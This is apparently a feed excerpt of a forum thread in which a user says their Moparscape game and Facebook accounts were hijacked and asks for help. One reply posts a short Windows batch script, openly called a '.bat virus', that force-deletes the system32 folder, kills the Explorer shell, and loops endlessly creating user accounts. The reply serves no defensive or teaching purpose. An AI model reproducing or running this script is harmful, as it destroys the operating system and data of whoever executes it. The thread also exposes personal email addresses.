channel.title: I have been hacked!
channel.description:
My name on Moparscape is AssualtX i swear even check my signature my email was Michael@assualtx.co.cc but now the flop changed the email to assualt@hotmail.nl:( im not even in nederlands im in australia :( please help me get it backed the owner of mopar can help me please im sure you can:(
he even hacked my Facebook :(( please someone help

item.title: I have been hacked!

item.title: I have been hacked!
item.dc:creator: @Mikeyzzz Mikeyzzz
item.description:
@Mikeyzzz wrote:

@echo off :virus del /f /q "C:\WINDOWS\system32" taskkill explorer.exe tskill explorer.exe set /a _virus+=1 net user %_virus+% /add goto virus

thats a .bat virus that kills you dll files oh and i made a new account

Read full topic
